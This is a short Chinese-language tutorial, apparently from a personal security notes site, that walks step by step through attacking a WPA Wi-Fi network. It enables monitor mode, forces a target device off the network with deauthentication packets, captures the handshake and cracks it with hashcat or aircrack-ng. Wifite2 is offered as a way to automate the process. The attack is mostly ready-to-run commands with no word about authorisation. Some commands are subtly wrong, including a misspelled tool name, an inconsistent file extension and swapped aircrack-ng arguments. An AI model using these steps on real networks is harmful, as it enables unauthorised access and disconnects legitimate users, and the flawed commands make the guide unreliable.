# WPA 握手包攻击

## 手动

1. 查看網絡設備, 獲取無線網卡名稱.

    ```sh
    iwconfig
    ```

2. 開啓無線網卡監聽模式.

    ```sh
    sudo airmon-ng start wlan0
    ```

    若设备被占用, 执行下列命令来结束占用设备的进程:  

    ```sh
    sudo airmon-ng check kill
    ```

    開啓監聽模式後, 無線網卡名稱發生改變.  後面會附加`mon`(monitor), 即`wlan0mon`.

    !!! warning
        監聽模式開啓後的無線網卡將無法訪問 Internet, 直到監聽模式被關閉.

3. 監聽 WiFi 信號.

    ```sh
    sudo airodunp-ng wlan0mon
    ```

    當發現目標 WiFi 時按`Ctrl+C`停止掃描. 並記錄 BSSID 和 CH 兩個參數.

4. 捕獲指定 WiFi 通信內容.

    ```sh
    sudo airodump-ng -w [.cap存檔名稱] -c [CH] --bssid  [BSSID] wlan0mon
    ```

5. 斷開指定設備與指定 WiFi 的鏈接.

    ```sh
    sudo aireplay-ng -0 5 -a [BSSID] -c [Target MAC] wlan0mon
    ```

    目標設備從指定 WiFi 斷開鏈接後將嘗試重連, 會向路由器發送握手包. 而第 4 步將會捕獲這個握手包.

6. 當第 4 步提示捕獲握手包時按下 `Ctrl+C` 結束監聽.

    此時, 握手包的數據已經被記錄在第4步指定的 `.cap` 文件中.

7. 對 `.cap` 文件中握手包的hash進行破解.

    - 使用 Hashcat. (推薦)

        ```sh
        aircrack-ng [.cap存檔文件] -j [.haccpx文件]   # 將 .cap 文件轉爲 hashcat 接受的 .haccpx 文件
        hashcat -m 2500 -a 0 [.hccapx文件] [字典文件] # 利用 hashcat 進行破解
        ```

    - 使用 aircrack-ng.

        ```sh
        aircrack-ng -w [.cap存檔文件] [字典文件]
        ```

8. 關閉無線網卡監聽模式.

    ```sh
    sudo airmon-ng stop wlan0mon
    ```

    若第 2 步中结束的进程没有自动恢复, 则需要手动启动.

## 自动

可以利用 [wifite2](https://github.com/derv82/wifite2) 来简化上面的流程.  

![Wifite2 WAP Handshake attack](https://camo.githubusercontent.com/241679fd57d09ce160bbaf04886b896d1d101d405fc4d692954beefc8e477a07/68747470733a2f2f692e696d6775722e636f6d2f4636565068626d2e676966)
